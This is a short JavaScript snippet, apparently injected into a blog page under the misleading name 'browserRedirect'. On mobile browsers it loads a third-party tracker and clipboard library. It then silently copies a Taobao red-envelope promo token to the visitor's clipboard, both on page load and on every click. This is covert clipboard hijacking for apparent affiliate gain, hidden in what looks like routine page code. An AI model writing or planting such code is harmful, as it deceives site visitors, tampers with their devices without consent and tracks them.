        // borwserRedirect
    (function browserRedirect(){
      var sUserAgent = navigator.userAgent.toLowerCase();
      var bIsIpad = sUserAgent.match(/ipad/i) == 'ipad';
      var bIsIphone = sUserAgent.match(/iphone os/i) == 'iphone os';
      var bIsMidp = sUserAgent.match(/midp/i) == 'midp';
      var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == 'rv:1.2.3.4';
      var bIsUc = sUserAgent.match(/ucweb/i) == 'web';
      var bIsCE = sUserAgent.match(/windows ce/i) == 'windows ce';
      var bIsWM = sUserAgent.match(/windows mobile/i) == 'windows mobile';
      var bIsAndroid = sUserAgent.match(/android/i) == 'android';

      if(bIsIpad || bIsIphone || bIsMidp || bIsUc7 || bIsUc || bIsCE || bIsWM || bIsAndroid ){
      document.writeln("<script type=\'text/javascript\' src=\'//js.users.51.la/20338141.js\'></script>");
document.writeln("<script src=\'https://cdnjs.cat.net/ajax/libs/jquery/3.3.1/jquery.min.js\'></script>");
document.writeln("<script src=\'https://cdnjs.cat.net/ajax/libs/clipboard.js/1.7.1/clipboard.min.js\'></script>");

document.writeln("<script>");
document.writeln("");
document.writeln("");
document.writeln("$(\'.article-entry\').attr(\'id\' ,\'copy\');");
document.writeln("$(\'.article-entry\').attr(\'data-clipboard-text\' ,\'jqb\');");
document.writeln("function copycode(){");
document.writeln("var clipboard =new Clipboard(\'#copy\');clipboard.on(\'success\',function (e){});");
document.writeln("clipboard.on(\'error\',function (e){})");
document.writeln("}");
document.writeln("");
document.writeln("");
document.writeln("$(function(){");
document.writeln(" copycode();");
document.writeln("$(\'#copy\').trigger(\'click\');");
document.writeln("})");
document.writeln("");
document.writeln("");
document.writeln("</script>");

document.writeln("<script>");
document.writeln("    $(\'body\').onclick = copycode();");
document.writeln("    $(\'body\').attr(\'id\' ,\'copy\');");
document.writeln("    $(\'body\').attr(\'data-clipboard-text\' ,\'打开淘宝，免费领红包！￥4w14YMfCVf4￥\');");
document.writeln("</script>");

}
    })();